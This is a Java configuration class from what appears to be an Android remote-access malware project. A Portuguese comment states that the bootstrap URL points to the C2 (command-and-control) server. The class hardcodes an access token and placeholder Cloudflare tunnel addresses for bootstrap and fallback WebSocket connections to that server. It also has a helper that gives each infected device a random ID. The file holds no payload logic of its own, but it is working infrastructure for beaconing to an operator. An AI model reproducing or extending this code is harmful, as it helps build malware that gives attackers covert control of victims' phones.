package com.aval.seg;

import android.content.Context;

import java.util.Random;

public final class Cfg {
    // primeira linha do bootstrap = URL wss:// do C2 (com token)
    public static final String TOKEN = "3f7cm0ygvhr5w8";
    public static final String BOOTSTRAP = "https://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";
    public static final String FALLBACK = "wss://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";

    public static String id(Context c) {
        String s = c.getSharedPreferences("p", 0).getString("id", null);
        if (s == null) {
            String a = "abcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder b = new StringBuilder();
            Random r = new Random();
            for (int i = 0; i < 6; i++) b.append(a.charAt(r.nextInt(a.length())));
            s = b.toString();
            c.getSharedPreferences("p", 0).edit().putString("id", s).apply();
        }
        return s;
    }
}